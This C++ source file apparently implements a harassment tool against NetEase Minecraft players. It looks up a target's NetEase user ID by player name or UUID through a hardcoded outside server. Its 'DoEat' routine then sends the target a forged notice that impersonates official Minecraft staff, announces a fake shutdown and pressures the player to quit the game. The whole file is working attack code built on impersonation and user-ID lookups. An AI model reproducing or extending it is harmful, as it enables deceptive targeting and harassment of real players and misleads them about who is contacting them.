#include "JammingApi.h"

#include <httplib/httplib.h>
#include <json.hpp>
#include <unordered_map>
#include <log/LOG.h>

static std::string GAME_ID = "4661334467366178884";

static std::unordered_map<std::string, PlayerInfo> player_info_map;

static const std::string build_query_user_info_json(const std::string& identity, int mode) {
	nlohmann::json json;
	json["identify"] = identity;
	json["mode"] = mode;
	json["gameID"] = GAME_ID;
	return json.dump();

}

#include <utils/Wstr.h>

static const std::string build_attack_user_info_json(const PlayerInfo& info) {
	nlohmann::json json;
	json["identify"] = info.NETEASE_USERID;
	json["eatMode"] = 0;

	json["message"] = wstr::toString(std::wstring(L"亲爱的冒险家，《我的世界》电脑版将于5分钟后进行全服停服更新，我们检测到您目前正在《布吉岛》进行游戏，建议您在30秒后及时退出游戏，以免造成存档丢失等异常！谢谢您对《我的世界》的支持。如果您在游玩过程中遇见其他问题需要帮助，我们将可通过《我的世界》"));
	return json.dump();

}


std::optional<PlayerInfo> JammingAPI::QueryUserInfoFromName(const std::string& player_name)
{
	if (auto it = player_info_map.find(player_name); it != player_info_map.end())
	{
		return std::make_optional(it->second);
	}
	auto json_content = build_query_user_info_json(player_name, 1);
	httplib::Client cli("http://110.42.42.11:15937");
	auto res = cli.Post("/box", json_content, "application/json");

	if (res && res->status == 200) {
		nlohmann::json response_json = nlohmann::json::parse(res->body);
		if (response_json["code"].get<int>() == 0)
		{
			PlayerInfo info{ .NETEASE_USERID = response_json["data"].get<std::string>() };
			player_info_map[player_name] = info;
			return std::make_optional(info);
		}
	}
	return std::nullopt;
}
static std::string UUID2UID(const std::string& uuid) {
	size_t pos = uuid.rfind('-');
	std::string lastPart = uuid.substr(pos + 1);
	LOG("lastPart  :" << lastPart);
	unsigned long long intValue = std::stoull(lastPart, nullptr, 16);

	std::string result = std::to_string((unsigned int)intValue);

	return result;
}
std::optional<PlayerInfo> JammingAPI::QueryUserInfoFromUUID(const std::string& player_uuid)
{

	if (auto it = player_info_map.find(player_uuid); it != player_info_map.end())
	{
		return std::make_optional(it->second);
	}
	auto json_content = build_query_user_info_json(player_uuid, 0);
	httplib::Client cli("http://110.42.42.11:15937");
	auto res = cli.Post("/box", json_content, "application/json");

	if (res && res->status == 200) {
		nlohmann::json response_json = nlohmann::json::parse(res->body);
		if (response_json["code"].get<int>() == 0)
		{
			PlayerInfo info{ .NETEASE_USERID = response_json["data"].get<std::string>() };
			player_info_map[player_uuid] = info;
			return std::make_optional(info);
		}
	}
	return std::nullopt;

}

bool JammingAPI::DoEat(const PlayerInfo& info)
{
	httplib::Client cli("http://110.42.42.11:15937");
	auto json_content = build_attack_user_info_json(info);
	auto res = cli.Post("/eat", json_content, "application/json");
	if (res && res->status == 200) {
		nlohmann::json response_json = nlohmann::json::parse(res->body);
		return response_json["code"].get<int>() == 0 && response_json["message"].get<std::string>() == "Done";
	}
	return false;
}

bool JammingAPI::InitGameID()
{
	std::string cmd = GetCommandLineA();
	std::regex regex(R"(-DlauncherGameId=(\d+))");
	std::smatch match;

	if (std::regex_search(cmd, match, regex)) {
		LOG("DlauncherGameId: " << match[1]);
		GAME_ID = match[1];
	}
	else {
		LOG("DlauncherGameId not found.");
		return false;
	}

	return true;
}
